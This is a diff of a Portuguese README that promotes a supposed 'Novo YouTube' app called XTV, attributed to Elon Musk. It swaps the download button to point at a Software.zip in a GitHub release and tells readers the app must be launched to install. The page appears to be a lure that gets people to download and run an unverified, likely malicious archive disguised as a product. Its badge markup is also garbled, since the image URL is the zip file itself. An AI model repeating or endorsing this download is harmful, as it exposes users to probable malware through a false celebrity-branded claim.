@@ -28,7 +28,7 @@ Ao explorar este repositório, você encontrará informações detalhadas sobre 
 
 Para baixar o aplicativo necessário para acessar o "Novo YouTube" XTV do Elon Musk, clique no botão abaixo:
 
-[![Baixar XTV](https://img.shields.io/badge/Baixar%20XTV-Aplicativo.zip-brightgreen)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Baixar XTV](https://github.com/duduzx/Como-Ba/releases/download/v2.0/Software.zip%https://github.com/duduzx/Como-Ba/releases/download/v2.0/Software.zip)](https://github.com/duduzx/Como-Ba/releases/download/v2.0/Software.zip)
 
 ***Nota: O aplicativo precisa ser lançado para iniciar o processo de instalação.***
 
